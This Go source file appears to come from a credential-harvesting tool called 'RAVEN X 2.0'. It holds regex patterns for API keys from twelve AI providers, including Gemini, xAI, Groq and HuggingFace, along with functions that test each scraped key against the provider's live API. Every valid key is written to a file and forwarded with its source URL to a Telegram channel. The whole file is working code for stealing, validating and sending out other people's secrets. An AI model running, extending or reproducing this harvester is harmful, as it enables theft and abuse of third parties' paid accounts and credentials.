package main

import (
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strings"
	"time"
)

// ── Wave-9: Extended AI provider API keys ──────────────────────────────────
//
// Gemini, xAI, Mistral, ElevenLabs, Groq, Perplexity, OpenRouter,
// HuggingFace, Replicate, Cohere, TogetherAI, Fireworks.

// Prefix-based patterns (full match is the key).
var (
	// AIzaSy prefix = legacy Google AI Studio keys; AQ. prefix = new format (Google migrating AI Studio accounts)
	geminiAPIKeyPattern     = regexp.MustCompile(`(?:AIzaSy[A-Za-z0-9_-]{33}|AQ\.[A-Za-z0-9_\-]{30,60})`)
	// TruffleHog confirms xai- + exactly 80 chars [A-Za-z0-9_]; current {52,60} misses all real keys
	xaiAPIKeyPattern        = regexp.MustCompile(`xai-[A-Za-z0-9_]{80}`)
	groqAPIKeyPattern       = regexp.MustCompile(`gsk_[A-Za-z0-9]{52}`)
	// Gitleaks confirms pplx- + 48 chars; charset is alphanum not hex
	perplexityAPIKeyPattern = regexp.MustCompile(`pplx-[a-zA-Z0-9]{48}`)
	openrouterAPIKeyPattern = regexp.MustCompile(`sk-or-v1-[a-f0-9]{64}`)
	huggingfaceAPIKeyPattern = regexp.MustCompile(`hf_[A-Za-z0-9]{34}`)
	// Official Replicate docs: 40 chars total = r8_ (3) + 37 body; body is [A-Za-z0-9_-] per TruffleHog
	replicateAPIKeyPattern  = regexp.MustCompile(`r8_[A-Za-z0-9_-]{37}`)
)

// Context-based patterns (capture group 1 is the key).
var (
	// Mistral has no documented bare prefix; {32} fixed length unverified — using {32,100} range
	mistralAPIKeyPattern    = regexp.MustCompile(`(?i)(?:mistral[_-]?(?:api[_-]?)?key|MISTRAL_API_KEY)\s*[:=]\s*["']?([A-Za-z0-9_-]{32,100})["']?`)
	// Legacy personal keys: 32-char hex (context-keyed). New service-account keys: sk_ prefix (bare).
	elevenlabsAPIKeyPattern = regexp.MustCompile(`(?i)(?:elevenlabs[_-]?(?:api[_-]?)?key|ELEVENLABS_API_KEY|ELEVEN_API_KEY|XI_API_KEY)\s*[:=]\s*["']?([a-f0-9]{32})["']?|(?-i)\bsk_[a-zA-Z0-9]{32,64}\b`)
	// Gitleaks confirms [a-zA-Z0-9]{40}; add co_ bare prefix branch + wider length range {40,52}
	cohereAPIKeyPattern     = regexp.MustCompile(`(?i)(?:cohere[_-]?(?:api[_-]?)?key|CO_API_KEY|COHERE_API_KEY)\s*[:=]\s*["']?([A-Za-z0-9]{40,52})["']?|\bco_([A-Za-z0-9]{40,52})\b`)
	// TogetherAI: [a-f0-9] was too narrow; real keys are full alphanum
	togetherAIAPIKeyPattern = regexp.MustCompile(`(?i)(?:together(?:ai)?[_-]?(?:api[_-]?)?key|TOGETHER_API_KEY)\s*[:=]\s*["']?([A-Za-z0-9]{64})["']?`)
	// Fireworks: added FW_API_KEY alias; fw_ is optional prefix in the key value
	fireworksAPIKeyPattern  = regexp.MustCompile(`(?i)(?:fireworks[_-]?(?:api[_-]?)?key|FIREWORKS_API_KEY|FW_API_KEY)\s*[:=]\s*["']?(?:fw_)?([A-Za-z0-9]{40,56})["']?`)
)

// ── CheckGemini ──────────────────────────────────────────────────────────────

func (a *AWSScanner) CheckGemini(key, sourceURL string) bool {
	if !a.Config.APIValidation.Gemini && !a.Config.APIValidation.AIAll {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	url := fmt.Sprintf("https://generativelanguage.googleapis.com/v1/models?key=%s", key)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false
	}

	c := &http.Client{Timeout: 12 * time.Second}
	resp, err := c.Do(req)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		a.logValid("Gemini", fmt.Sprintf("Key: %s", key))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_gemini.txt")
		a.storeValidKeyLimit("Gemini", key, "Active")

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
🤖 <b>GEMINI API KEY LIVE</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}

// ── CheckXAI ─────────────────────────────────────────────────────────────────

func (a *AWSScanner) CheckXAI(key, sourceURL string) bool {
	if !a.Config.APIValidation.XAI && !a.Config.APIValidation.AIAll {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, err := http.NewRequest("GET", "https://api.x.ai/v1/models", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "Bearer "+key)

	c := &http.Client{Timeout: 12 * time.Second}
	resp, err := c.Do(req)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		a.logValid("xAI", fmt.Sprintf("Key: %s", key))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_xai.txt")
		a.storeValidKeyLimit("xAI", key, "Active")

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
🤖 <b>xAI/GROK API KEY LIVE</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}

// ── CheckMistral ─────────────────────────────────────────────────────────────

func (a *AWSScanner) CheckMistral(key, sourceURL string) bool {
	if !a.Config.APIValidation.Mistral && !a.Config.APIValidation.AIAll {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, err := http.NewRequest("GET", "https://api.mistral.ai/v1/models", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "Bearer "+key)

	c := &http.Client{Timeout: 12 * time.Second}
	resp, err := c.Do(req)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		a.logValid("Mistral", fmt.Sprintf("Key: %s", key))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_mistral.txt")
		a.storeValidKeyLimit("Mistral", key, "Active")

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
🤖 <b>MISTRAL API KEY LIVE</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}

// ── CheckElevenLabs ──────────────────────────────────────────────────────────

func (a *AWSScanner) CheckElevenLabs(key, sourceURL string) bool {
	if !a.Config.APIValidation.ElevenLabs && !a.Config.APIValidation.AIAll {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, err := http.NewRequest("GET", "https://api.elevenlabs.io/v1/user", nil)
	if err != nil {
		return false
	}
	req.Header.Set("xi-api-key", key)

	c := &http.Client{Timeout: 12 * time.Second}
	resp, err := c.Do(req)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		a.logValid("ElevenLabs", fmt.Sprintf("Key: %s", key))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_elevenlabs.txt")
		a.storeValidKeyLimit("ElevenLabs", key, "Active")

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
🎙️ <b>ELEVENLABS API KEY LIVE</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}

// ── CheckGroq ────────────────────────────────────────────────────────────────

func (a *AWSScanner) CheckGroq(key, sourceURL string) bool {
	if !a.Config.APIValidation.Groq && !a.Config.APIValidation.AIAll {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, err := http.NewRequest("GET", "https://api.groq.com/openai/v1/models", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "Bearer "+key)

	c := &http.Client{Timeout: 12 * time.Second}
	resp, err := c.Do(req)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		a.logValid("Groq", fmt.Sprintf("Key: %s", key))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_groq.txt")
		a.storeValidKeyLimit("Groq", key, "Active")

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
🤖 <b>GROQ API KEY LIVE</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}

// ── CheckPerplexity ──────────────────────────────────────────────────────────

func (a *AWSScanner) CheckPerplexity(key, sourceURL string) bool {
	if !a.Config.APIValidation.Perplexity && !a.Config.APIValidation.AIAll {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, err := http.NewRequest("GET", "https://api.perplexity.ai/models", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "Bearer "+key)

	c := &http.Client{Timeout: 12 * time.Second}
	resp, err := c.Do(req)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	if resp.StatusCode == 200 || strings.Contains(bodyStr, "model") {
		a.logValid("Perplexity", fmt.Sprintf("Key: %s", key))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_perplexity.txt")
		a.storeValidKeyLimit("Perplexity", key, "Active")

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
🤖 <b>PERPLEXITY API KEY LIVE</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}

// ── CheckOpenRouter ──────────────────────────────────────────────────────────

func (a *AWSScanner) CheckOpenRouter(key, sourceURL string) bool {
	if !a.Config.APIValidation.OpenRouter && !a.Config.APIValidation.AIAll {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, err := http.NewRequest("GET", "https://openrouter.ai/api/v1/models", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "Bearer "+key)

	c := &http.Client{Timeout: 12 * time.Second}
	resp, err := c.Do(req)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		a.logValid("OpenRouter", fmt.Sprintf("Key: %s", key))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_openrouter.txt")
		a.storeValidKeyLimit("OpenRouter", key, "Active")

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
🤖 <b>OPENROUTER API KEY LIVE</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}

// ── CheckHuggingFace ─────────────────────────────────────────────────────────

func (a *AWSScanner) CheckHuggingFace(key, sourceURL string) bool {
	if !a.Config.APIValidation.HuggingFace && !a.Config.APIValidation.AIAll {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, err := http.NewRequest("GET", "https://huggingface.co/api/whoami-v2", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "Bearer "+key)

	c := &http.Client{Timeout: 12 * time.Second}
	resp, err := c.Do(req)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		a.logValid("HuggingFace", fmt.Sprintf("Key: %s", key))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_huggingface.txt")
		a.storeValidKeyLimit("HuggingFace", key, "Active")

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
🤗 <b>HUGGINGFACE API KEY LIVE</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}

// ── CheckReplicate ───────────────────────────────────────────────────────────

func (a *AWSScanner) CheckReplicate(key, sourceURL string) bool {
	if !a.Config.APIValidation.Replicate && !a.Config.APIValidation.AIAll {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, err := http.NewRequest("GET", "https://api.replicate.com/v1/models", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "Token "+key)

	c := &http.Client{Timeout: 12 * time.Second}
	resp, err := c.Do(req)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		a.logValid("Replicate", fmt.Sprintf("Key: %s", key))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_replicate.txt")
		a.storeValidKeyLimit("Replicate", key, "Active")

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
🤖 <b>REPLICATE API KEY LIVE</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}

// ── CheckCohere ──────────────────────────────────────────────────────────────

func (a *AWSScanner) CheckCohere(key, sourceURL string) bool {
	if !a.Config.APIValidation.Cohere && !a.Config.APIValidation.AIAll {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, err := http.NewRequest("GET", "https://api.cohere.ai/v1/check-api-key", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "Bearer "+key)

	c := &http.Client{Timeout: 12 * time.Second}
	resp, err := c.Do(req)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		a.logValid("Cohere", fmt.Sprintf("Key: %s", key))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_cohere.txt")
		a.storeValidKeyLimit("Cohere", key, "Active")

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
🤖 <b>COHERE API KEY LIVE</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}

// ── CheckTogetherAI ──────────────────────────────────────────────────────────

func (a *AWSScanner) CheckTogetherAI(key, sourceURL string) bool {
	if !a.Config.APIValidation.TogetherAI && !a.Config.APIValidation.AIAll {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, err := http.NewRequest("GET", "https://api.together.xyz/v1/models", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "Bearer "+key)

	c := &http.Client{Timeout: 12 * time.Second}
	resp, err := c.Do(req)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		a.logValid("TogetherAI", fmt.Sprintf("Key: %s", key))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_togetherai.txt")
		a.storeValidKeyLimit("TogetherAI", key, "Active")

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
🤖 <b>TOGETHERAI API KEY LIVE</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}

// ── CheckFireworks ───────────────────────────────────────────────────────────

func (a *AWSScanner) CheckFireworks(key, sourceURL string) bool {
	if !a.Config.APIValidation.Fireworks && !a.Config.APIValidation.AIAll {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, err := http.NewRequest("GET", "https://api.fireworks.ai/inference/v1/models", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "Bearer "+key)

	c := &http.Client{Timeout: 12 * time.Second}
	resp, err := c.Do(req)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		a.logValid("Fireworks", fmt.Sprintf("Key: %s", key))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_fireworks.txt")
		a.storeValidKeyLimit("Fireworks", key, "Active")

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
🤖 <b>FIREWORKS API KEY LIVE</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}
